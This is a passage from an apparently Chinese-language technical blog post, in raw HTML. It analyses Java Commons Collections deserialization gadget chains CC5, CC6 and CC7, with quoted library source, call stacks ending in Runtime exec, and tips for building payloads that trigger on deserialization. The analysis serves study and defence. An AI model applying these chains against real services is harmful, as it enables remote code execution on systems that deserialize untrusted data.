String) &#123;</div><div class="line">            val= valObj;</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></div><div class="line">                || valObj <span class="keyword">instanceof</span> Long</div><div class="line">                || valObj <span class="keyword">instanceof</span> Integer</div><div class="line">                || valObj <span class="keyword">instanceof</span> Float</div><div class="line">                || valObj <span class="keyword">instanceof</span> Double</div><div class="line">                || valObj <span class="keyword">instanceof</span> Byte</div><div class="line">                || valObj <span class="keyword">instanceof</span> Short</div><div class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</div><div class="line">            val = valObj.toString();    <span class="comment">//这里是关键点，调用toString()</span></div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            val = System.identityHashCode(valObj) + <span class="string">"@"</span> + valObj.getClass().getName();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="tiedmapentry类">TiedMapEntry类</h3>
<p>TiedMapEntry类中可以有如下执行路径： <code>toString</code> -&gt; <code>getValue</code> -&gt; <code>this.map.get(this.key)</code> ，从而可以触发LazyMap的 <code>get</code> ：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title">Entry</span>, <span class="title">KeyValue</span>, <span class="title">Serializable</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">8453869361373831205L</span>;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map map;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object key;</div><div class="line"></div><div class="line">    <span class="comment">//构造函数，显然我们可以控制 this.map 为 LazyMap</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TiedMapEntry</span><span class="params">(Map map, Object key)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.map = map;</div><div class="line">        <span class="keyword">this</span>.key = key;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">//toString函数，注意这里调用了 getValue()</span></div><div class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getKey() + <span class="string">"="</span> + <span class="keyword">this</span>.getValue();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">//跟进 getValue(), 这是关键点 this.map.get() 触发 LazyMap.get()</span></div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>调用栈：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">-&gt;BadAttributeValueExpException.readObject()</div><div class="line">    -&gt;TiedMapEntry.toString()</div><div class="line">    -&gt;TiedMapEntry.getValue()</div><div class="line">        -&gt;LazyMap.get()</div><div class="line">        -&gt;ChainedTransformer.transform()</div><div class="line">        -&gt;ConstantTransformer.transform()</div><div class="line">        -&gt;InvokerTransformer.transform()</div><div class="line">        ... <span class="comment">//与CC1相同，获取getMethod 、invoke 、exec</span></div></pre></td></tr></table></figure>
<p>在java 7中，BadAttributeValueExpException并没有实现readObject方法，并且toString方法也不满足条件，所以该链无法使用：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BadAttributeValueExpException</span> <span class="keyword">extends</span> <span class="title">Exception</span>   </span>&#123;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">3105272988410493376L</span>;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> Object val;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BadAttributeValueExpException</span> <span class="params">(Object val)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.val = val;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span>  </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">"BadAttributeValueException: "</span> + val;</div><div class="line">    &#125;</div><div class="line"> &#125;</div></pre></td></tr></table></figure>
<h3 id="idea调试的坑">idea调试的坑</h3>
<p>在调试CC5时，由于IDEA会<strong>隐式调用对象的 <code>toString()</code> </strong>，导致在payload生成阶段就会触发，并且使产生的序列化数据出错，导致反序列化时触发payload失败。</p>
<ul>
<li><a href="https://blog.csdn.net/lkforce/article/details/90479650" target="_blank" rel="external">关于IDEA在debug时私自调用toString()方法的问题</a></li>
</ul>
<h2 id="cc6">CC6</h2>
<p>环境要求：CC 3.1-3.2.1，jdk 1.7, 1.8</p>
<p>该链采用HashMap的 <code>reaObject()</code> 作为入口，经过 <code>putForCreate</code> -&gt; <code>hash(key)</code> -&gt; <code>k.hashCode()</code> 以触发TiedMapEntry类的 <code>hashCode()</code></p>
<h3 id="hashmap类">HashMap类</h3>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;, <span class="title">Cloneable</span>, <span class="title">Serializable</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</div><div class="line">        ...</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</div><div class="line">            K key = (K) s.readObject();</div><div class="line">            V value = (V) s.readObject();</div><div class="line">            putForCreate(key, value);<span class="comment">//关键点</span></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">     <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">putForCreate</span><span class="params">(K key, V value)</span> </span>&#123;</div><div class="line">        <span class="keyword">int</span> hash = <span class="keyword">null</span> == key ? <span class="number">0</span> : hash(key); <span class="comment">//关键点，key可控，赋值为TiedMapEntry</span></div><div class="line">        <span class="keyword">int</span> i = indexFor(hash, table.length);</div><div class="line">        ...</div><div class="line">        createEntry(hash, key, value, i);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object k)</span> </span>&#123;</div><div class="line">        <span class="keyword">int</span> h = hashSeed;</div><div class="line">        <span class="keyword">if</span> (<span class="number">0</span> != h &amp;&amp; k <span class="keyword">instanceof</span> String) &#123;</div><div class="line">            <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        h ^= k.hashCode();  <span class="comment">//关键点，触发 TiedMapEntry.hashCode()</span></div><div class="line">        ...</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<h3 id="tiedmapentry类-1">TiedMapEntry类</h3>
<p>该类的hashCode存在执行路径： <code>this.getValue()</code> -&gt; <code>this.map.get(this.key)</code> 从而触发LazyMap的 <code>get</code> 方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title">Entry</span>, <span class="title">KeyValue</span>, <span class="title">Serializable</span> </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map map;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object key;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TiedMapEntry</span><span class="params">(Map map, Object key)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.map = map;</div><div class="line">        <span class="keyword">this</span>.key = key;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</div><div class="line">        Object value = <span class="keyword">this</span>.getValue();<span class="comment">//关键点</span></div><div class="line">        <span class="keyword">return</span> (<span class="keyword">this</span>.getKey() == <span class="keyword">null</span> ? <span class="number">0</span> : <span class="keyword">this</span>.getKey().hashCode()) ^ (value == <span class="keyword">null</span> ? <span class="number">0</span> : value.hashCode()); </div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key); <span class="comment">// 可以调用LazyMap的get</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>调用栈：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">-&gt;HashMap.readObject()</div><div class="line">    -&gt;HashMap.putForCreate()</div><div class="line">    -&gt;HashMap.hash()</div><div class="line">        -&gt;TiedMapEntry.hashCode()</div><div class="line">        -&gt;TiedMapEntry.getValue()</div><div class="line">            -&gt;LazyMap.get()</div><div class="line">                -&gt;ChainedTransformer.transform()</div><div class="line">                -&gt;ConstantTransformer.transform()</div><div class="line">                -&gt;InvokerTransformer.transform()</div><div class="line">                -&gt;...<span class="comment">//Runtime、getRuntime、exec...</span></div></pre></td></tr></table></figure>
<p>需要注意的是，在payload构造代码中，会执行 <code>res.put(tiedMapEntry, &quot;something&quot;);</code> ，这里需要先对chainedTransformer用1占位，以免 <code>put</code> 会提前触发payload，并且导致报错出现，序列化对象出错，反序列化不会触发恶意payload。</p>
<h2 id="cc7">CC7</h2>
<p>环境要求：CC 3.1-3.2.1，jdk 1.7, 1.8</p>
<p>虽然与之前的一些链一样用到了LazyMap，但前面的链都是生硬地直接去调用LazyMap的get方法，而CC7链的核心思想在于真正利用LazyMap这个装饰类能够调用用户自定义的factory对象的transform方法（与该类的设计思想一致），该链以Hashtable的readObject为入口。这个链在构造时有很多细节，涉及到装饰器模式、多个类的继承和接口的实现，以及hash碰撞等细节。</p>
<h3 id="hashtable类">Hashtable类</h3>
<p>Hashtable的readObject存在 <code>reconstitutionPut(table, key, value)</code> -&gt; <code>e.key.equals(key)</code> 的执行路径（其中，e可控，类型为 <code>Hashtable.Entry&lt;K, V&gt;[]</code> ），该方法用来在反序列化时还原HashTable中各个元素的值：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hashtable</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;</span></div><div class="line"><span class="class">    <span class="keyword">extends</span> <span class="title">Dictionary</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;</span></div><div class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">Map</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;, <span class="title">Cloneable</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></div><div class="line"><span class="function">         <span class="keyword">throws</span> IOException, ClassNotFoundException</span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">       ...</div><div class="line">       <span class="comment">//初始化Entry列表，该列表会在反序列化过程中慢慢还原</span></div><div class="line">       Entry&lt;K,V&gt;[] table = <span class="keyword">new</span> Entry[length];</div><div class="line">       ...</div><div class="line">        <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</div><div class="line">            K key = (K)s.readObject();</div><div class="line">            V value = (V)s.readObject();</div><div class="line"></div><div class="line">            reconstitutionPut(table, key, value); <span class="comment">// 关键点</span></div><div class="line">        &#125;</div><div class="line">        <span class="keyword">this</span>.table = table;</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">    </div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reconstitutionPut</span><span class="params">(Entry&lt;K,V&gt;[] tab, K key, V value)</span></span></div><div class="line"><span class="function">        <span class="keyword">throws</span> StreamCorruptedException</span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        ...</div><div class="line">        <span class="keyword">for</span> (Entry&lt;K,V&gt; e = tab[index] ; e != <span class="keyword">null</span> ; e = e.next) &#123;</div><div class="line">            <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<span class="comment">// 关键点，e可控 e.key.equals</span></div><div class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        ...</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="lazymap类进一步理解以及hashmap">LazyMap类进一步理解以及HashMap</h3>
<p>在这里，我们用到用LazyMap来装饰的HashMap对象。</p>
<p>虽然前面的CC1用到了该类，但对CC1的理解并不需要熟悉LazyMap的具体作用，而CC7则需要对其进行熟悉。LazyMap类实际上是一个用来装饰其他Map（比如HashMap）的装饰器，当调用LazyMap的get方法时，会去调用其修饰的Map的对应get方法（在原来的get基础上附加调用用户规定的 <code>this.factory</code> 中的 <code>transform()</code> ），<strong>LazyMap的作用就是在被装饰者不包含某键名的Entry时调用工厂类去产生一个Entry</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyMap</span> <span class="keyword">extends</span> <span class="title">AbstractMapDecorator</span> </span></div><div class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">Map</span>, <span class="title">Serializable</span> </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</div><div class="line">        <span class="comment">// create value for key if key is not currently in the map</span></div><div class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="keyword">false</span>) &#123; <span class="comment">// 附加操作</span></div><div class="line">            Object value = factory.transform(key);</div><div class="line">            map.put(key, value);</div><div class="line">            <span class="keyword">return</span> value;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> map.get(key);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>并且，该类继承了 <code>AbstractMapDecorator</code> 抽象类，类似地， <code>AbstractMapDecorator</code> 类的 <code>equals()</code> ，同样起到装饰器作用，会调用被装饰者的 <code>equals()</code> ：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title">Map</span> </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object object)</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span> (object == <span class="keyword">this</span>) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> map.equals(object);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们回到上一步分析的链，现在到了 <code>e.key.equals(key)</code> ，这里其实是在尝试检查现在要加入的Entry的key值是不是真的和列表中已有的Entry的key是完全一样的（前面一步是计算它们的hash，并且hash是一样的）。此处会调用LazyMap的 <code>equals</code> 方法，也就是会调用其装饰的HashMap的 <code>equals</code> 方法。然后HashMap继承了 <code>AbstractMap</code> 类，所以调用的实际上是 <code>AbstractMap#equals()</code> ：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</div><div class="line">    ...</div><div class="line">    Map&lt;K,V&gt; m = (Map&lt;K,V&gt;) o;</div><div class="line">    ...</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</div><div class="line">            <span class="keyword">while</span> (i.hasNext()) &#123;</div><div class="line">                Entry&lt;K,V&gt; e = i.next();</div><div class="line">                K key = e.getKey();</div><div class="line">                V value = e.getValue();</div><div class="line">                <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</div><div class="line">                    <span class="keyword">if</span> (!(m.get(key)==<span class="keyword">null</span> &amp;&amp; m.containsKey(key)))</div><div class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                    <span class="keyword">if</span> (!value.equals(m.get(key))) <span class="comment">// 关键点，调用LazyMap的get方法</span></div><div class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        ...</div><div class="line">    ...</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里便会调用LazyMap的get方法，然后就回到了之前的CC命令执行的阶段，大致调用栈：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">-&gt;Hashtable.readObject()</div><div class="line">-&gt;Hashtable.reconstitutionPut()</div><div class="line">    -&gt;AbstractMapDecorator.equals</div><div class="line">        -&gt;AbstractMap.equals()</div><div class="line">            -&gt;LazyMap.get.get()</div><div class="line">                -&gt;ChainedTransformer.transform()</div><div class="line">                -&gt;ConstantTransformer.transform()</div><div class="line">                -&gt;InvokerTransformer.transform()</div><div class="line">                -&gt;...<span class="comment">//Runtime、getRuntime、exec...</span></div></pre></td></tr></table></figure>
<h3 id="一些细节">一些细节</h3>
<p><strong>1. payload构造时为什么要用两个LazyMap？</strong></p>
<p>在 <code>java\util\Hashtable.java#reconstitutionPut</code> 中，实际上是实现了在调用反序列化时对Hashtable中的一个Entry进行还原的操作，其中，关键语句 <code>e.key.equals(key)</code> 是在对现在还原的部分与要添加的新键值对元素的查重操作中发生的（在反序列化的时候，不应该出现重复的元素，否则报错），所以如果table中只有一个元素，就<strong>不会进行查重操作</strong>，无法触发payload：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reconstitutionPut</span><span class="params">(Entry&lt;K,V&gt;[] tab, K key, V value)</span></span></div><div class="line"><span class="function">        <span class="keyword">throws</span> StreamCorruptedException</span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        ...</div><div class="line">        <span class="comment">// Makes sure the key is not already in the hashtable.</span></div><div class="line">        <span class="comment">// This should not happen in deserialized version.</span></div><div class="line">        <span class="keyword">int</span> hash = hash(key);</div><div class="line">        <span class="keyword">int</span> index = (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</div><div class="line">        <span class="keyword">for</span> (Entry&lt;K,V&gt; e = tab[index] ; e != <span class="keyword">null</span> ; e = e.next) &#123;</div><div class="line">            <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</div><div class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="comment">// Creates the new entry.</span></div><div class="line">        Entry&lt;K,V&gt; e = tab[index];</div><div class="line">        tab[index] = <span class="keyword">new</span> Entry&lt;&gt;(hash, key, value, e);</div><div class="line">        count++;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p><strong>2. 为什么要删除LazyMap2中key为yy的元素？</strong></p>
<p>直观来看： <code>hashtable.put(lazyMap2, &quot;test&quot;);</code> 会使得lazyMap2增加一个多余的 <code>yy=&gt;yy</code> 键值对，需要删除掉。如果不删掉，待加入的Entry的size就和已有的Entry的size不同，从而使执行流程<strong>提前终止</strong>，无法触发恶意流程。下面我们来详细看一下怎么回事：</p>
<ol type="1">
<li>为什么会增加一个多余的 <code>yy=&gt;yy</code> 键值对？</li>
</ol>
<p>在 <code>AbstractMap#equals()</code> 中，会获取HashTable的key，并调用 <code>m.get(key)</code> ，即调用LazyMap装饰器的 <code>get()</code> 方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</div><div class="line">        ...</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</div><div class="line">            <span class="keyword">while</span> (i.hasNext()) &#123;</div><div class="line">                Entry&lt;K,V&gt; e = i.next();</div><div class="line">                K key = e.getKey();<span class="comment">//这里会获取HashTable的key，也就是yy</span></div><div class="line">                V value = e.getValue();</div><div class="line">                <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</div><div class="line">                    <span class="keyword">if</span> (!(m.get(key)==<span class="keyword">null</span> &amp;&amp; m.containsKey(key)))</div><div class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                    <span class="keyword">if</span> (!value.equals(m.get(key)))</div><div class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div></pre></td></tr></table></figure>
<p>而在我们构造的payload中，LazyMap的factory设置为了 <code>ChainedTransformer</code> ，此时 <code>LazyMap#get</code> 会调用factory的 <code>transform()</code> 方法，并在现在的map中加入这个元素（LazyMap的作用就是在被装饰者不包含某键名的Entry时调用工厂类去产生一个Entry），联系装饰器的作用可以很好地理解：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyMap</span></span></div><div class="line"><span class="class">        <span class="keyword">extends</span> <span class="title">AbstractMapDecorator</span></span></div><div class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">Map</span>, <span class="title">Serializable</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</div><div class="line">        <span class="comment">// create value for key if key is not currently in the map</span></div><div class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="keyword">false</span>) &#123;<span class="comment">//如果没有包含这个key</span></div><div class="line">            Object value = factory.transform(key);<span class="comment">//注意这里，尝试获取一个值</span></div><div class="line">            map.put(key, value);<span class="comment">//注意这里，插入了获取的值</span></div><div class="line">            <span class="keyword">return</span> value;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> map.get(key);</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>而这时， <code>ChainedTransformer</code> 正好返回了值 <code>yy</code> ，所以便对lazyMap2装饰的HashTable插入了一个 <code>yy=&gt;yy</code> 。</p>
<ol start="2" type="1">
<li>为什么会提前终止流程？</li>
</ol>
<p>同样是在 <code>AbstractMap#equals()</code> 中，会提前判断待定的两者的size，如果不同，就会终止流程：</p>
